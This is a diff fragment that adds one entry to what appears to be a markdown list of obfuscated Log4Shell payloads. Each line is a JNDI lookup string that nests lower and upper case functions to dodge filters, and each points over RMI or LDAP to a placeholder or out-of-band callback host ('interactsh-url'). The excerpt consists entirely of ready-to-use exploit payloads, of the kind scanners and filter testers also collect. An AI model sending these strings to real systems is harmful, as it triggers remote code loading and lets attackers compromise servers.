@@ -14,6 +14,8 @@ ${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
 ${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
 ${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
 ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
+${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}
+
 ```
 
 
